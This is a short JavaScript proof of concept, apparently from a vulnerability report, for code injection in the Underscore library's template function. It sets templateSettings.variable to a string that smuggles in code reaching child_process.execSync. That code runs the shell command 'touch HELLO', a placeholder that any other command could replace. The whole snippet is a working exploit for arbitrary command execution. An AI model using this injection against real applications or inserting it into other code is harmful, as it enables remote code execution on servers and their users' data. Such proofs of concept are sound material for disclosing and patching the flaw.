const _ = require('./src/underscore');
_.templateSettings.variable = "a " +
    "= this.process.mainModule.require('child_process').execSync('touch HELLO')"; const t = _.template("")();